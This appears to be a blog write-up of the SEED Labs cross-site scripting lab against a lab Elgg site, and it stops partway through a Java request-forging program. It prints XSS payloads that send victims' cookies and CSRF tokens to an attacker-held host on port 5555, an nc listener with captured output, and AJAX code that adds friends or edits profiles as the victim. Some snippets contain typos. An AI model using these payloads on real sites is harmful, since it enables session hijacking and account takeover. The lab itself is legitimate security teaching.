<!DOCTYPE html><html lang="en" mode="dark" ><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no"><meta name="day-prompt" content="days ago"><meta name="hour-prompt" content="hours ago"><meta name="minute-prompt" content="minutes ago"><meta name="justnow-prompt" content="just now"><meta name="pv-proxy-endpoint" content="https://myochosite-291718.appspot.com/query?id=ahNwfm15b2Nob3NpdGUtMjkxNzE4chULEghBcGlRdWVyeRiAgIDo14eBCgw"><meta name="generator" content="Jekyll v4.3.2" /><meta property="og:title" content="SEED Labs – Cross-Site Scripting Attack Lab" /><meta property="og:locale" content="en" /><meta name="description" content="SEED Labs – Cross-Site Scripting Attack Lab" /><meta property="og:description" content="SEED Labs – Cross-Site Scripting Attack Lab" /><link rel="canonical" href="https://ocholuo.github.io//posts/SEED-Labs-CrossSiteScripting-Attack-Lab/" /><meta property="og:url" content="https://ocholuo.github.io//posts/SEED-Labs-CrossSiteScripting-Attack-Lab/" /><meta property="og:site_name" content="Grace" /><meta property="og:type" content="article" /><meta property="article:published_time" content="2020-08-20T11:11:11-04:00" /><meta name="twitter:card" content="summary" /><meta property="twitter:title" content="SEED Labs – Cross-Site Scripting Attack Lab" /><meta name="twitter:site" content="@twitter_username" /> <script type="application/ld+json"> {"@context":"https://schema.org","@type":"BlogPosting","dateModified":"2023-01-02T17:29:51-05:00","datePublished":"2020-08-20T11:11:11-04:00","description":"SEED Labs – Cross-Site Scripting Attack Lab","headline":"SEED Labs – Cross-Site Scripting Attack Lab","mainEntityOfPage":{"@type":"WebPage","@id":"https://ocholuo.github.io//posts/SEED-Labs-CrossSiteScripting-Attack-Lab/"},"url":"https://ocholuo.github.io//posts/SEED-Labs-CrossSiteScripting-Attack-Lab/"}</script><title>SEED Labs – Cross-Site Scripting Attack Lab | Grace</title><link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png"><link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png"><link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png"><link rel="manifest" href="/assets/img/favicons/site.webmanifest"><link rel="shortcut icon" href="/assets/img/favicons/favicon.ico"><meta name="apple-mobile-web-app-title" content="Grace"><meta name="application-name" content="Grace"><meta name="msapplication-TileColor" content="#da532c"><meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml"><meta name="theme-color" content="#ffffff"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://fonts.gstatic.com"><link rel="preconnect" href="https://www.google-analytics.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://www.google-analytics.com"><link rel="preconnect" href="https://www.googletagmanager.com" crossorigin="anonymous"><link rel="dns-prefetch" href="https://www.googletagmanager.com"><link rel="preconnect" href="https://myochosite-291718.appspot.com" crossorigin="use-credentials"><link rel="dns-prefetch" href="https://myochosite-291718.appspot.com"><link rel="preconnect" href="https://cdn.jsdelivr.net"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css"><link rel="stylesheet" href="/assets/css/style.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css"> <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script><body data-spy="scroll" data-target="#toc"><div id="sidebar" class="d-flex flex-column align-items-end" lang="en"><div class="profile-wrapper text-center"><div id="avatar"> <a href="/" alt="avatar" class="mx-auto"> <img src="/assets/img/huoye.jpg" alt="avatar" onerror="this.style.display='none'"> </a></div><div class="site-title mt-3"> <a href="/">Grace</a></div><div class="site-subtitle font-italic">2023 Mar 14 updated</div></div><ul class="w-100"><li class="nav-item"> <a href="/" class="nav-link"> <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i> <span>HOME</span> </a><li class="nav-item"> <a href="/categories/" class="nav-link"> <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i> <span>CATEGORIES</span> </a><li class="nav-item"> <a href="/tags/" class="nav-link"> <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i> <span>TAGS</span> </a><li class="nav-item"> <a href="/archives/" class="nav-link"> <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i> <span>ARCHIVES</span> </a><li class="nav-item"> <a href="/about/" class="nav-link"> <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i> <span>ABOUT</span> </a></ul><div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center"> <a href="https://github.com/ocholuo" aria-label="github" target="_blank" rel="noopener"> <i class="fab fa-github-alt"></i> </a> <a href="https://twitter.com/twitter_username" aria-label="twitter" target="_blank" rel="noopener"> <i class="fab fa-twitter"></i> </a> <a href=" javascript:location.href = 'mailto:' + ['',''].join('@')" aria-label="email" > <i class="fas fa-envelope"></i> </a> <a href="/feed.xml" aria-label="rss" > <i class="fas fa-rss"></i> </a></div></div><div id="topbar-wrapper" class="row justify-content-center topbar-down"><div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between"> <span id="breadcrumb"> <span> <a href="/"> Home </a> </span> <span>SEED Labs – Cross-Site Scripting Attack Lab</span> </span> <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i><div id="topbar-title"> Post</div><i id="search-trigger" class="fas fa-search fa-fw"></i> <span id="search-wrapper" class="align-items-center"> <i class="fas fa-search fa-fw"></i> <input class="form-control" id="search-input" type="search" aria-label="search" autocomplete="off" placeholder="Search..."> <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i> </span> <span id="search-cancel" >Cancel</span></div></div><div id="main-wrapper"><div id="main"><div class="row"><div id="post-wrapper" class="col-12 col-lg-11 col-xl-8"><div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4"><h1 data-toc-skip>SEED Labs – Cross-Site Scripting Attack Lab</h1><div class="post-meta text-muted d-flex flex-column"><div> <span class="semi-bold"> Grace JyL </span> on <span class="timeago " data-toggle="tooltip" data-placement="bottom" title="Thu, Aug 20, 2020, 11:11 AM -0400" >Aug 20, 2020<i class="unloaded">2020-08-20T11:11:11-04:00</i> </span></div><div> <span> Updated <span class="timeago lastmod" data-toggle="tooltip" data-placement="bottom" title="Mon, Jan 2, 2023, 2:29 PM -0800" >Jan 2<i class="unloaded">2023-01-02T17:29:51-05:00</i> </span> </span> <span class="readtime" data-toggle="tooltip" data-placement="bottom" title="2220 words">12 min read</span> <span id="pv" class="pageviews"> <i class="fas fa-spinner fa-spin fa-fw"></i> </span> views</div></div><div class="post-content"><h1 id="seed-labs--cross-site-scripting-attack-lab">SEED Labs – Cross-Site Scripting Attack Lab</h1><p>[toc]</p><hr /><h2 id="brief">Brief</h2><ul><li>The tasks are based on a web application called <code class="language-plaintext highlighter-rouge">ELGG</code> which is open source.<li>The prebuilt vm called <code class="language-plaintext highlighter-rouge">seedubuntu</code> is used to host the web application and few users already created.<li>Logging in to the web app will be done from a different vm on the same virtual box network.<li>user11: attacker</ul><hr /><h2 id="task-1--post-a-malicious-message-to-display-an-alert-window">Task 1 : Post a malicious message to display an alert window</h2><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="dl">'</span><span class="s1">XSS</span><span class="dl">'</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><hr /><h2 id="task-2--posting-a-malicious-message-to-display-cookies">Task 2 : Posting a malicious message to display cookies</h2><ul><li>When a user14 navigates to user11’s account<li>user14’s cookie gets displayed.<li>By design, the browser does not display the code, it runs it.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre><span class="c1">// short code</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nf">alert</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span>
<span class="c1">// long code</span>
<span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span> <span class="nx">src</span><span class="o">=</span><span class="dl">"</span><span class="s2">http网站//www.example.com/myscripts.js</span><span class="dl">"</span><span class="o">&gt;&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span><span class="c1">// store the JavaScript program in a standalone file</span>
<span class="c1">// save it with the .js extension</span>
<span class="c1">// refer to it using the src attribute in the &lt;script&gt; tag.</span>
</pre></table></code></div></div><hr /><h2 id="task-3--stealing-cookies-from-the-victims-machine">Task 3 : Stealing cookies from the victim’s machine</h2><ul><li>provide code in the ‘about me’ section<ul><li>obtain the cookie without having to be preset when the account of user11 is visited.</ul><li>injects a code that basically is a <code class="language-plaintext highlighter-rouge">GET request</code> for an image and also adds the cookie of the victim in the url itself.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
</pre><td class="rouge-code"><pre><span class="c1">// send out the cookies using http GET</span>
<span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
<span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src=http网址attackerIP:5555?c= </span><span class="dl">'</span> <span class="o">+</span> <span class="nf">escape</span><span class="p">(</span><span class="nx">decument</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span> <span class="o">+</span> <span class="dl">'</span><span class="s1"> &gt;</span><span class="dl">'</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><ul><li>when the browser tries to load the image from the URL in the <code class="language-plaintext highlighter-rouge">src</code> field<li>an <code class="language-plaintext highlighter-rouge">HTTP GET request</code> sent to the attacker’s machine.<ul><li>in the mean time, it sends the cookies to the <code class="language-plaintext highlighter-rouge">port 5555</code> of the attacker’s machine</ul><li>the attacker has a TCP server listening to the same port.<ul><li><code class="language-plaintext highlighter-rouge">$ nc -l 5555 -v</code></ul><li>The server can print out whatever it receives.<li>The next time someone on the web application, say alice visits the profile of user11, the code gets executed and the attacker gains the cookie for himself. The nc output seems like -</ul><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
</pre><td class="rouge-code"><pre>// The cookie starts after %3D.

GET /?c=Elgg%3Dtlgbp3diifsf0007299puq2kr1 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
</pre></table></code></div></div><hr /><h2 id="task-4--session-hijacking-using-the-stolen-cookies">Task 4 : session hijacking using the stolen cookies</h2><ul><li>stealing the session of a legitimate user by using their cookie and then add the victim as a friend.</ul><h3 id="capture-the-get-request-packet">capture the GET request packet</h3><ul><li>the process of adding a friend has to be known to the attacker.<ul><li>the attacker creates another account say samy.<li>This account can be added as a friend to user11’s account to observe the process of adding a friend.</ul><li>The attacker logs in to the account of samy and visits user11.<ul><li>Then he enables the inspect mode of the browser<li>watch the requests and cookies as he adds user11 as a friend to samy.</ul><li>The friend adding process then shows a <code class="language-plaintext highlighter-rouge">GET request</code><ul><li><code class="language-plaintext highlighter-rouge">http网址www.xsslabelgg.com/action/friends/add?friend=43&amp;__elgg_ts=15281&amp;__elgg_token=f0aaabcel</code><li>userid &amp; Time Stamp &amp; Security Token</ul></ul><blockquote><p>Using the <code class="language-plaintext highlighter-rouge">"HTTP Header Live"</code> add-on to Inspect HTTP Headers</p></blockquote><p><img data-proofer-ignore data-src="https://i.imgur.com/rRo8aig.png" alt="Screen Shot 2020-09-20 at 00.18.19" /></p><p><img data-proofer-ignore data-src="https://i.imgur.com/lzjweg9.png" alt="Screen Shot 2020-09-20 at 00.16.52" /></p><h3 id="construct-the-url-for-send-add-friend-request">construct the URL for send add friend Request</h3><ul><li>retrieve the two tokens</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span>
    <span class="nb">document</span><span class="p">.</span><span class="nf">write</span><span class="p">(</span><span class="dl">'</span><span class="s1">&lt;img src=http网址attackerIP:5555?c= </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&amp; </span><span class="dl">'</span> <span class="o">+</span> <span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span> <span class="o">+</span> <span class="dl">'</span><span class="s1">&gt;</span><span class="dl">'</span><span class="p">);</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><p>The nc output seems like this, &amp; separate the token.</p><div class="language-plaintext highlighter-rouge"><div class="code-header" text-data="plaintext"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
</pre><td class="rouge-code"><pre>GET /?c=1520227817&amp;0fab54e97b2fa75c39d298de602a5939 HTTP/1.1
Host: 192.168.56.4:1234
Accept: */*
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: keep-alive
</pre></table></code></div></div><ul><li>If the web app does not match passwords (or the case when we have the password of the intended victim)<li>can simply use a python script to use the authentication and use requests module to send a <code class="language-plaintext highlighter-rouge">GET request</code> and the attack will have been executed.<li>The code<ul><li>take the input from the nc command, split into sections to get the required cookies and the tokens.<li>send a request to the desired link using the <code class="language-plaintext highlighter-rouge">HTTPBasicAuth</code> module and the cookies and parameters set along with the <code class="language-plaintext highlighter-rouge">GET request</code>.<li>This can be used in cases when the script file we make is bigger than the allowed number of characters inside the text box that has the vulnerability.</ul></ul><p>To actually make other accounts execute the malicious code, the code needs to be in the same place where the previous codes to obtain cookie and the tokens were placed. This is the case when the password of the victim is not held with the attacker.</p><ul><li>use the following code in javascript using AJAX<li>store it into the ‘about me’ section of user11.</ul><p>This code forms the <code class="language-plaintext highlighter-rouge">GET request</code> to duplicate the add friend action of the web app.</p><ul><li>When the victim say alice views the homepage of the attacker user11,<li>her browser will read this code<li>execute the javascript inside the tags.<li>Since the user is logged in while the code is executed, the attack will run smoothly and user11 will be added to the friend list of alice.</ul><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>

<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="nf">function </span><span class="p">()</span> <span class="p">{</span>
    <span class="c1">// access Security Token __elgg_token</span>
    <span class="kd">var</span> <span class="nx">token</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&amp;__elgg_token</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

    <span class="c1">// access Time Stamp __elgg_ts</span>
    <span class="kd">var</span> <span class="nx">ts</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">&amp;__elgg_ts</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>

    <span class="c1">// user ID from LiveHTTPHeader</span>
    <span class="kd">var</span> <span class="nx">sendurl</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">http网址www.web.com/action/add?friend=42</span><span class="dl">"</span><span class="o">+</span><span class="nx">ts</span><span class="o">=</span><span class="nx">token</span><span class="p">;</span>

    <span class="c1">// write the Ajax cod</span>
    <span class="nx">Ajax</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>

    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">GET</span><span class="dl">"</span><span class="p">,</span> <span class="nx">sendurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">www.web.com</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>  <span class="c1">// access the session cookie</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">send</span><span class="p">();</span>
<span class="p">}</span>
<span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
</span></pre></table></code></div></div><h3 id="post-with-js---modify-profile">POST with Js - modify profile</h3><p><img data-proofer-ignore data-src="https://i.imgur.com/75zUEkB.png" alt="Screen Shot 2020-09-20 at 01.02.54" /></p><ol><li><p>capture the POST request packet</p><li><p>construct the URL for send add friend Request</p><li><p>write the Ajax code</p></ol><div class="language-js highlighter-rouge"><div class="code-header" text-data="js"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
</pre><td class="rouge-code"><pre><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">type</span><span class="o">=</span><span class="dl">"</span><span class="s2">text/javascript</span><span class="dl">"</span><span class="o">&gt;</span>
<span class="nb">window</span><span class="p">.</span><span class="nx">onload</span> <span class="o">=</span> <span class="kd">function</span><span class="p">(){</span>

    <span class="c1">//JavaScript code to access user name, user guid, Time Stamp __elgg_ts and Security Token __elgg_token</span>
    <span class="kd">var</span> <span class="nx">userName</span><span class="o">=</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">name</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">guid</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;guid=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">ts</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_ts=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_ts</span><span class="p">;</span>
    <span class="kd">var</span> <span class="nx">token</span><span class="o">=</span><span class="dl">"</span><span class="s2">&amp;__elgg_token=</span><span class="dl">"</span><span class="o">+</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">security</span><span class="p">.</span><span class="nx">token</span><span class="p">.</span><span class="nx">__elgg_token</span><span class="p">;</span>

    <span class="c1">//Construct the content</span>
    <span class="kd">var</span> <span class="nx">content</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">My new profile text.</span><span class="dl">"</span><span class="p">;</span>

    <span class="c1">//Create and send Ajax request to modify profile</span>
    <span class="nx">Ajax</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span> <span class="nx">sendurl</span><span class="p">,</span> <span class="kc">true</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">www.web.com</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Keep-Alive</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">300</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Connection</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">keep-alive</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Cookie</span><span class="dl">"</span><span class="p">,</span> <span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
    <span class="nx">Ajax</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>

    <span class="kd">var</span> <span class="nx">samyGuid</span><span class="o">=</span><span class="nx">AAVVXX</span><span class="p">;</span> <span class="c1">//FILL IN</span>
    <span class="nf">if</span><span class="p">(</span><span class="nx">elgg</span><span class="p">.</span><span class="nx">session</span><span class="p">.</span><span class="nx">user</span><span class="p">.</span><span class="nx">guid</span><span class="o">!=</span><span class="nx">samyGuid</span><span class="p">)</span> <span class="p">{</span>
        <span class="c1">//Create and send Ajax request to modify profile</span>
        <span class="kd">var</span> <span class="nx">Ajax</span><span class="o">=</span><span class="kc">null</span><span class="p">;</span>
        <span class="nx">Ajax</span><span class="o">=</span><span class="k">new</span> <span class="nc">XMLHttpRequest</span><span class="p">();</span>
        <span class="nx">Ajax</span><span class="p">.</span><span class="nf">open</span><span class="p">(</span><span class="dl">"</span><span class="s2">POST</span><span class="dl">"</span><span class="p">,</span><span class="nx">sendurl</span><span class="p">,</span><span class="kc">true</span><span class="p">);</span>
        <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Host</span><span class="dl">"</span><span class="p">,</span><span class="dl">"</span><span class="s2">www.xsslabelgg.com</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">Ajax</span><span class="p">.</span><span class="nf">setRequestHeader</span><span class="p">(</span><span class="dl">"</span><span class="s2">Content-Type</span><span class="dl">"</span><span class="p">,</span> <span class="dl">"</span><span class="s2">application/x-www-form-urlencoded</span><span class="dl">"</span><span class="p">);</span>
        <span class="nx">Ajax</span><span class="p">.</span><span class="nf">send</span><span class="p">(</span><span class="nx">content</span><span class="p">);</span>
    <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><div class="language-java highlighter-rouge"><div class="code-header" text-data="java"><button data-original-title="Copied!"><i class="far fa-clone"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
60
61
62
63
64
65
66
67
68
69
70
71
72
</pre><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">java.io.*</span><span class="o">;</span>
<span class="kn">import</span> <span class="nn">java.net.*</span><span class="o">;</span>

<span class="kd">public</span> <span class="kd">class</span> <span class="nc">HTTPSimpleForge</span> <span class="o">{</span>
    <span class="kd">public</span> <span class="kd">static</span> <span class="kt">void</span> <span class="nf">main</span><span class="o">(</span><span class="nc">String</span><span class="o">[]</span> <span class="n">args</span><span class="o">)</span> <span class="kd">throws</span> <span class="nc">IOException</span> <span class="o">{</span>
    <span class="k">try</span> <span class="o">{</span>
        <span class="kt">int</span> <span class="n">responseCode</span><span class="o">;</span>
        <span class="nc">InputStream</span> <span class="n">responseIn</span><span class="o">=</span><span class="kc">null</span><span class="o">;</span>

        <span class="nc">String</span> <span class="n">requestDetails</span> <span class="o">=</span> <span class="s">"&amp;__elgg_ts=&lt;&lt;correct_elgg_ts_value&gt;&gt;&amp;__elgg_token=&lt;&lt;correct_elgg_token_value&gt;&gt;"</span><span class="o">;</span>

        <span class="c1">// URL to be forged.</span>
        <span class="no">URL</span> <span class="n">url</span> <span class="o">=</span> <span class="k">new</span> <span class="no">URL</span> <span class="o">(</span><span class="s">"http网址www.xsslabelgg.com/action/friends/add?friend=&lt;&lt;friend_user_guid&gt;&gt;"</span><span class="o">+</span><span class="n">requestDetails</span><span class="o">);</span>

        <span class="c1">// URLConnection instance is created</span>
        <span class="c1">// to further parameterize a resource request past what the state members of URL instance can represent.</span>
        <span class="nc">HttpURLConnection</span> <span class="n">urlConn</span> <span class="o">=</span> <span class="o">(</span><span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="n">url</span><span class="o">.</span><span class="na">openConnection</span><span class="o">();</span>
        <span class="k">if</span> <span class="o">(</span><span class="n">urlConn</span> <span class="k">instanceof</span> <span class="nc">HttpURLConnection</span><span class="o">)</span> <span class="o">{</span>
            <span class="n">urlConn</span><span class="o">.</span><span class="na">setConnectTimeout</span><span class="o">(</span><span class="mi">60000</span><span class="o">);</span>
            <span class="n">urlConn</span><span class="o">.</span><span class="na">setReadTimeout</span><span class="o">(</span><span class="mi">90000</span><span class="o">);</span>
        <span class="o">}</span>

        <span class="c1">// addRequestProperty method</span>
        <span class="c1">// to add HTTP Header Information.</span>
        <span class="c1">// add User-Agent HTTP header to the forged HTTP packet.</span>
        <span class="c1">// Add other necessary HTTP Headers yourself. Cookies should be stolen</span>
        <span class="c1">// using the method in task3.</span>
        <span class="n">urlConn</span><span class="o">.</span><span class="na">addRequestProperty</span><span class="o">(</span><span class="s">"User-agent"</span><span class="o">,</span><span class="s">"Sun JDK 1.6"</span><span class="o">);</span>

        <span class="c1">//HTTP Post Data which includes the information to be sent to the server.</span>
        <span class="nc">String</span> <span class="n">data</span> <span class="o">=</span> <span class="s">"name=...&amp;guid=.."</span><span class="o">;</span>

        <span class="c1">// DoOutput flag of URL Connection</span>
        <span class="c1">// should be set to true to send HTTP POST message.</span>
        <span class="n">urlConn</span><span class="o">.</span><span class="na">setDoOutput</span><span class="o">(</span><span class="kc">true</span><span class="o">);</span>

        <span class="c1">// OutputStreamWriter is used to write the HTTP POST data</span>
        <span class="c1">// to the url connection.</span>
        <span class="nc">OutputStreamWriter</span> <span class="n">wr</span> <span class="o">=</span> <span class="k">new</span> <span class="nc">OutputStreamWriter</span><span class="o">(</span><span class="n">urlConn</span><span class="o">.</span><span class="na">getOutputStream</span><span class="o">());</span>
